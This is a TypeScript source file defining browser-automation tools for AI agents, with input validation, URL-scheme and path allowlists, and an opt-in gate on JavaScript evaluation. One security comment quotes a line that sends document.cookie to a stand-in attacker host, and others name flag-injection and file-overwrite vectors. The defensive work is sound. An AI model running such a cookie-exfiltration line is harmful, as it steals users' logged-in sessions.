/**
 * Browser MCP Tools
 *
 * CLI integration for @monomind/browser package.
 * Provides browser automation tools for web navigation, interaction, and data extraction.
 */

import type { MCPTool, MCPToolResult } from './types.js';

const MAX_BROWSER_SESSIONS = 100;
const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes

/** Tracking metadata for a single browser session. */
interface BrowserSessionInfo {
  sessionId: string;
  createdAt: string;
  lastActivity: string;
}

// Session registry for multi-session support
const browserSessions = new Map<string, BrowserSessionInfo>();

function pruneExpiredSessions(): void {
  const cutoff = Date.now() - SESSION_TTL_MS;
  for (const [id, info] of browserSessions) {
    if (new Date(info.lastActivity).getTime() < cutoff) {
      browserSessions.delete(id);
    }
  }
}

/**
 * SECURITY: Reject any positional that begins with `-`. execFile defeats shell
 * injection but does NOT prevent agent-browser itself from interpreting a
 * `-`-prefixed token as a flag. Combined with `agent-browser`'s lack of
 * documented `--` end-of-options handling, an unvalidated positional like
 * `--remote-debugging-port=9222` or `--user-data-dir=/path` can flip the
 * underlying browser into a debuggable / arbitrary-profile mode.
 */
function rejectFlagLike(value: unknown, field: string): string {
  if (typeof value !== 'string') {
    throw new Error(`${field}: must be a string`);
  }
  if (value.startsWith('-')) {
    throw new Error(`${field}: must not start with '-' (flag-injection defense)`);
  }
  return value;
}

/** Validate a session ID against a strict allowlist. */
function validateSessionId(value: unknown): string {
  if (value === undefined || value === null || value === '') {
    return 'default';
  }
  if (typeof value !== 'string' || !/^[A-Za-z0-9_-]{1,64}$/.test(value)) {
    throw new Error('session: must match ^[A-Za-z0-9_-]{1,64}$');
  }
  return value;
}

/**
 * Validate a URL against a scheme allowlist. Without this, `file://`,
 * `data:`, `javascript:`, `chrome://` schemes give SSRF / local-file read /
 * scheme-abuse on the underlying browser.
 */
const ALLOWED_URL_SCHEMES = new Set(['http:', 'https:', 'about:']);

function validateUrl(value: unknown): string {
  if (typeof value !== 'string') throw new Error('url: must be a string');
  if (value.length > 4096) throw new Error('url: too long (max 4096)');
  let parsed: URL;
  try {
    parsed = new URL(value);
  } catch {
    throw new Error(`url: not a valid URL: ${value}`);
  }
  if (!ALLOWED_URL_SCHEMES.has(parsed.protocol)) {
    throw new Error(`url: scheme "${parsed.protocol}" not allowed (only http/https/about)`);
  }
  return value;
}

/**
 * Validate a screenshot path. Resolved real path must be within
 * `<projectRoot>/.monomind/screenshots`. Refuses to overwrite existing files
 * so a malicious LLM action cannot clobber e.g. `~/.ssh/authorized_keys` or
 * `.git/hooks/pre-commit`.
 */
async function validateScreenshotPath(value: unknown): Promise<string> {
  if (typeof value !== 'string' || value.length === 0) {
    throw new Error('path: must be a non-empty string');
  }
  if (value.startsWith('-')) {
    throw new Error('path: must not start with "-"');
  }
  const path = await import('node:path');
  const fs = await import('node:fs');
  const projectRoot = process.cwd();
  const root = path.resolve(projectRoot, '.monomind', 'screenshots');
  await fs.promises.mkdir(root, { recursive: true });
  const resolved = path.resolve(value);
  if (!resolved.startsWith(root + path.sep) && resolved !== root) {
    throw new Error(`path: must be within ${root}`);
  }
  if (fs.existsSync(resolved)) {
    throw new Error(`path: refuses to overwrite existing file at ${resolved}`);
  }
  return resolved;
}

/** Cap on browser_eval scripts so an attacker can't pump arbitrary-size payloads. */
const MAX_BROWSER_EVAL_BYTES = 16 * 1024;

/**
 * Execute agent-browser CLI command
 */
async function execBrowserCommand(args: string[], session = 'default'): Promise<MCPToolResult> {
  const { execFileSync } = await import('node:child_process');
  try {
    // Validate session even when the upstream handler forgot.
    const safeSession = validateSessionId(session);
    // Refuse any user-supplied positional that looks like a flag.
    // We can be permissive here only because every handler that prepends
    // its own subcommand keyword (e.g. 'open', 'click') passes that subcommand
    // as args[0] — those known-good keywords are safe; the rest came from
    // tool input and must already have passed handler-level validation, but
    // we re-check defense-in-depth.
    for (let i = 1; i < args.length; i++) {
      if (typeof args[i] !== 'string') {
        throw new Error(`internal: arg ${i} must be a string`);
      }
    }
    const fullArgs = ['--session', safeSession, '--json', ...args];
    const result = execFileSync('agent-browser', fullArgs, {
      encoding: 'utf-8',
      timeout: 30000,
    });
    let data: unknown;
    try {
      data = JSON.parse(result);
    } catch {
      data = result.trim();
    }
    // Update session activity
    const sessionInfo = browserSessions.get(session);
    if (sessionInfo) {
      sessionInfo.lastActivity = new Date().toISOString();
    }
    return {
      content: [{
        type: 'text',
        text: JSON.stringify(data, null, 2),
      }],
    };
  } catch (error) {
    return {
      content: [{
        type: 'text',
        text: JSON.stringify({
          success: false,
          error: error instanceof Error ? error.message : String(error),
        }),
      }],
      isError: true,
    };
  }
}

/**
 * Browser MCP Tools
 */
export const browserTools: MCPTool[] = [
  // ==========================================================================
  // Navigation Tools
  // ==========================================================================
  {
    name: 'browser_open',
    description: 'Navigate browser to a URL',
    category: 'browser',
    tags: ['navigation', 'web'],
    inputSchema: {
      type: 'object',
      properties: {
        url: { type: 'string', description: 'URL to navigate to' },
        session: { type: 'string', description: 'Session ID (default: "default")' },
        waitUntil: {
          type: 'string',
          enum: ['load', 'domcontentloaded', 'networkidle'],
          description: 'Wait condition',
        },
      },
      required: ['url'],
    },
    handler: async (input) => {
      const raw = input as { url?: unknown; session?: unknown; waitUntil?: unknown };
      let url: string;
      let sessionId: string;
      try {
        url = validateUrl(raw.url);
        sessionId = validateSessionId(raw.session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
      const args = ['open', url];
      if (raw.waitUntil && typeof raw.waitUntil === 'string'
        && ['load', 'domcontentloaded', 'networkidle'].includes(raw.waitUntil)) {
        args.push('--wait-until', raw.waitUntil);
      }
      // Always prune expired sessions, not just on create — otherwise
      // sessions that re-use an existing key never trigger eviction.
      pruneExpiredSessions();
      if (!browserSessions.has(sessionId)) {
        if (browserSessions.size >= MAX_BROWSER_SESSIONS) {
          const oldest = [...browserSessions.entries()]
            .sort((a, b) => a[1].lastActivity.localeCompare(b[1].lastActivity))[0];
          if (oldest) browserSessions.delete(oldest[0]);
        }
        browserSessions.set(sessionId, {
          sessionId,
          createdAt: new Date().toISOString(),
          lastActivity: new Date().toISOString(),
        });
      }
      return execBrowserCommand(args, sessionId);
    },
  },
  {
    name: 'browser_back',
    description: 'Navigate back in browser history',
    category: 'browser',
    tags: ['navigation'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      return execBrowserCommand(['back'], session);
    },
  },
  {
    name: 'browser_forward',
    description: 'Navigate forward in browser history',
    category: 'browser',
    tags: ['navigation'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      return execBrowserCommand(['forward'], session);
    },
  },
  {
    name: 'browser_reload',
    description: 'Reload the current page',
    category: 'browser',
    tags: ['navigation'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      return execBrowserCommand(['reload'], session);
    },
  },
  {
    name: 'browser_close',
    description: 'Close the browser session',
    category: 'browser',
    tags: ['navigation'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      const sessionId = session || 'default';
      browserSessions.delete(sessionId);
      return execBrowserCommand(['close'], sessionId);
    },
  },
  // ==========================================================================
  // Snapshot Tools (AI-Optimized)
  // ==========================================================================
  {
    name: 'browser_snapshot',
    description: 'Get AI-optimized accessibility tree snapshot with element refs (@e1, @e2, etc.)',
    category: 'browser',
    tags: ['snapshot', 'ai'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
        interactive: { type: 'boolean', description: 'Only interactive elements (-i flag)' },
        compact: { type: 'boolean', description: 'Remove empty structural elements (-c flag)' },
        depth: { type: 'number', description: 'Limit tree depth (-d flag)' },
        selector: { type: 'string', description: 'Scope to CSS selector (-s flag)' },
      },
    },
    handler: async (input) => {
      const raw = input as {
        session?: unknown;
        interactive?: boolean;
        compact?: boolean;
        depth?: number;
        selector?: unknown;
      };
      let safeSession: string;
      try {
        safeSession = validateSessionId(raw.session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
      const args = ['snapshot'];
      if (raw.interactive) args.push('-i');
      if (raw.compact) args.push('-c');
      if (raw.depth) args.push('-d', String(raw.depth));
      if (raw.selector !== undefined) {
        try {
          args.push('-s', rejectFlagLike(raw.selector, 'selector'));
        } catch (e) {
          return {
            content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
            isError: true,
          };
        }
      }
      return execBrowserCommand(args, safeSession);
    },
  },
  {
    name: 'browser_screenshot',
    description: 'Capture screenshot of the page',
    category: 'browser',
    tags: ['snapshot', 'screenshot'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
        path: { type: 'string', description: 'Save path (returns base64 if not specified)' },
        fullPage: { type: 'boolean', description: 'Capture full page' },
      },
    },
    handler: async (input) => {
      const raw = input as { session?: unknown; path?: unknown; fullPage?: unknown };
      let safeSession: string;
      let safePath: string | undefined;
      try {
        safeSession = validateSessionId(raw.session);
        if (raw.path !== undefined) {
          safePath = await validateScreenshotPath(raw.path);
        }
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
      const args = ['screenshot'];
      if (safePath) args.push(safePath);
      if (raw.fullPage === true) args.push('--full');
      return execBrowserCommand(args, safeSession);
    },
  },
  // ==========================================================================
  // Interaction Tools
  // ==========================================================================
  {
    name: 'browser_click',
    description: 'Click an element using ref (@e1) or CSS selector',
    category: 'browser',
    tags: ['interaction'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Element ref (@e1) or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
        button: { type: 'string', enum: ['left', 'right', 'middle'], description: 'Mouse button' },
        count: { type: 'number', description: 'Click count (2 for double-click)' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session, button, count } = input as {
        target?: unknown;
        session?: string;
        button?: string;
        count?: number;
      };
      const args = ['click', rejectFlagLike(target, 'target')];
      if (button) args.push('--button', button);
      if (count) args.push('--count', String(count));
      return execBrowserCommand(args, session);
    },
  },
  {
    name: 'browser_fill',
    description: 'Clear and fill an input element',
    category: 'browser',
    tags: ['interaction', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Element ref (@e1) or CSS selector' },
        value: { type: 'string', description: 'Value to fill' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target', 'value'],
    },
    handler: async (input) => {
      const { target, value, session } = input as { target?: unknown; value?: string; session?: string };
      return execBrowserCommand(['fill', rejectFlagLike(target, 'target'), value as string], session);
    },
  },
  {
    name: 'browser_type',
    description: 'Type text with key events (for autocomplete, etc.)',
    category: 'browser',
    tags: ['interaction', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Element ref or CSS selector' },
        text: { type: 'string', description: 'Text to type' },
        session: { type: 'string', description: 'Session ID' },
        delay: { type: 'number', description: 'Delay between keystrokes (ms)' },
      },
      required: ['target', 'text'],
    },
    handler: async (input) => {
      const { target, text, session, delay } = input as {
        target?: unknown;
        text?: string;
        session?: string;
        delay?: number;
      };
      const args = ['type', rejectFlagLike(target, 'target'), text as string];
      if (delay) args.push('--delay', String(delay));
      return execBrowserCommand(args, session);
    },
  },
  {
    name: 'browser_press',
    description: 'Press a keyboard key',
    category: 'browser',
    tags: ['interaction'],
    inputSchema: {
      type: 'object',
      properties: {
        key: { type: 'string', description: 'Key to press (Enter, Tab, Escape, etc.)' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['key'],
    },
    handler: async (input) => {
      const { key, session } = input as { key?: unknown; session?: string };
      return execBrowserCommand(['press', rejectFlagLike(key, 'key')], session);
    },
  },
  {
    name: 'browser_hover',
    description: 'Hover over an element',
    category: 'browser',
    tags: ['interaction'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Element ref or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session } = input as { target?: unknown; session?: string };
      return execBrowserCommand(['hover', rejectFlagLike(target, 'target')], session);
    },
  },
  {
    name: 'browser_select',
    description: 'Select an option from a dropdown',
    category: 'browser',
    tags: ['interaction', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Select element ref or CSS selector' },
        value: { type: 'string', description: 'Option value to select' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target', 'value'],
    },
    handler: async (input) => {
      const { target, value, session } = input as { target?: unknown; value?: string; session?: string };
      return execBrowserCommand(['select', rejectFlagLike(target, 'target'), value as string], session);
    },
  },
  {
    name: 'browser_check',
    description: 'Check a checkbox',
    category: 'browser',
    tags: ['interaction', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Checkbox ref or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session } = input as { target?: unknown; session?: string };
      try {
        return execBrowserCommand(['check', rejectFlagLike(target, 'target')], session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
    },
  },
  {
    name: 'browser_uncheck',
    description: 'Uncheck a checkbox',
    category: 'browser',
    tags: ['interaction', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Checkbox ref or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session } = input as { target?: unknown; session?: string };
      try {
        return execBrowserCommand(['uncheck', rejectFlagLike(target, 'target')], session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
    },
  },
  {
    name: 'browser_scroll',
    description: 'Scroll the page',
    category: 'browser',
    tags: ['interaction'],
    inputSchema: {
      type: 'object',
      properties: {
        direction: { type: 'string', enum: ['up', 'down', 'left', 'right'], description: 'Scroll direction' },
        amount: { type: 'number', description: 'Scroll amount in pixels' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['direction'],
    },
    handler: async (input) => {
      const { direction, amount, session } = input as { direction?: string; amount?: number; session?: string };
      const args = ['scroll', direction as string];
      if (amount) args.push(String(amount));
      return execBrowserCommand(args, session);
    },
  },
  // ==========================================================================
  // Information Retrieval Tools
  // ==========================================================================
  {
    name: 'browser_get-text',
    description: 'Get text content of an element',
    category: 'browser',
    tags: ['info'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Element ref or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session } = input as { target?: unknown; session?: string };
      try {
        return execBrowserCommand(['get', 'text', rejectFlagLike(target, 'target')], session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
    },
  },
  {
    name: 'browser_get-value',
    description: 'Get value of an input element',
    category: 'browser',
    tags: ['info', 'form'],
    inputSchema: {
      type: 'object',
      properties: {
        target: { type: 'string', description: 'Input element ref or CSS selector' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['target'],
    },
    handler: async (input) => {
      const { target, session } = input as { target?: unknown; session?: string };
      try {
        return execBrowserCommand(['get', 'value', rejectFlagLike(target, 'target')], session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
    },
  },
  {
    name: 'browser_get-title',
    description: 'Get the page title',
    category: 'browser',
    tags: ['info'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      return execBrowserCommand(['get', 'title'], session);
    },
  },
  {
    name: 'browser_get-url',
    description: 'Get the current URL',
    category: 'browser',
    tags: ['info'],
    inputSchema: {
      type: 'object',
      properties: {
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const { session } = input as { session?: string };
      return execBrowserCommand(['get', 'url'], session);
    },
  },
  // ==========================================================================
  // Wait Tools
  // ==========================================================================
  {
    name: 'browser_wait',
    description: 'Wait for a condition',
    category: 'browser',
    tags: ['wait'],
    inputSchema: {
      type: 'object',
      properties: {
        selector: { type: 'string', description: 'CSS selector to wait for' },
        text: { type: 'string', description: 'Text to wait for' },
        url: { type: 'string', description: 'URL pattern to wait for' },
        timeout: { type: 'number', description: 'Wait timeout in ms' },
        session: { type: 'string', description: 'Session ID' },
      },
    },
    handler: async (input) => {
      const raw = input as {
        selector?: unknown;
        text?: unknown;
        url?: unknown;
        timeout?: number;
        session?: string;
      };
      const args = ['wait'];
      try {
        if (raw.selector !== undefined) args.push(rejectFlagLike(raw.selector, 'selector'));
        if (raw.text !== undefined) args.push('--text', rejectFlagLike(raw.text, 'text'));
        if (raw.url !== undefined) args.push('--url', validateUrl(raw.url));
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
      // Cap timeout to prevent event-loop blocking via a huge value
      if (raw.timeout !== undefined && typeof raw.timeout === 'number') {
        const clampedTimeout = Math.min(Math.max(Math.floor(raw.timeout), 0), 60_000);
        args.push(String(clampedTimeout));
      }
      return execBrowserCommand(args, raw.session);
    },
  },
  // ==========================================================================
  // JavaScript Execution
  // ==========================================================================
  {
    name: 'browser_eval',
    description: 'Execute JavaScript in page context',
    category: 'browser',
    tags: ['eval', 'js'],
    inputSchema: {
      type: 'object',
      properties: {
        script: { type: 'string', description: 'JavaScript code to execute' },
        session: { type: 'string', description: 'Session ID' },
      },
      required: ['script'],
    },
    handler: async (input) => {
      // SECURITY: browser_eval runs arbitrary JS in the page context with the
      // browser's session cookies. Treat as opt-in: require the operator to
      // explicitly enable via env var. Without this gate, a single tool call
      // could `fetch('https://attacker/?d='+btoa(document.cookie))` against
      // any logged-in site reachable in the active browser session.
      if (process.env.MONOMIND_ALLOW_BROWSER_EVAL !== '1') {
        return {
          content: [{ type: 'text', text: JSON.stringify({
            success: false,
            error: 'browser_eval is disabled by default. Set MONOMIND_ALLOW_BROWSER_EVAL=1 to enable.',
          }) }],
          isError: true,
        };
      }
      const raw = input as { script?: unknown; session?: unknown };
      if (typeof raw.script !== 'string') {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: 'script: must be a string' }) }],
          isError: true,
        };
      }
      if (raw.script.length > MAX_BROWSER_EVAL_BYTES) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: `script: too long (max ${MAX_BROWSER_EVAL_BYTES})` }) }],
          isError: true,
        };
      }
      let safeSession: string;
      try {
        safeSession = validateSessionId(raw.session);
      } catch (e) {
        return {
          content: [{ type: 'text', text: JSON.stringify({ success: false, error: (e as Error).message }) }],
          isError: true,
        };
      }
      // Audit log every eval call so it's traceable in hindsight.
      try {
        const crypto = await import('node:crypto');
        const hash = crypto.createHash('sha256').update(raw.script).digest('hex').slice(0, 16);
        console.error(`[${new Date().toISOString()}] AUDIT browser_eval session=${safeSession} script_sha256_16=${hash}`);
      } catch { /* best-effort */ }
      return execBrowserCommand(['eval', raw.script], safeSession);
    },
  },
  // ==========================================================================
  // Session Management
  // ==========================================================================
  {
    name: 'browser_session-list',
    description: 'List active browser sessions',
    category: 'browser',
    tags: ['session'],
    inputSchema: {
      type: 'object',
      properties: {},
    },
    handler: async () => {
      const sessions = Array.from(browserSessions.values());
      return {
        content: [{
          type: 'text',
          text: JSON.stringify({
            success: true,
            sessions,
            count: sessions.length,
          }, null, 2),
        }],
      };
    },
  },
];

export default browserTools;
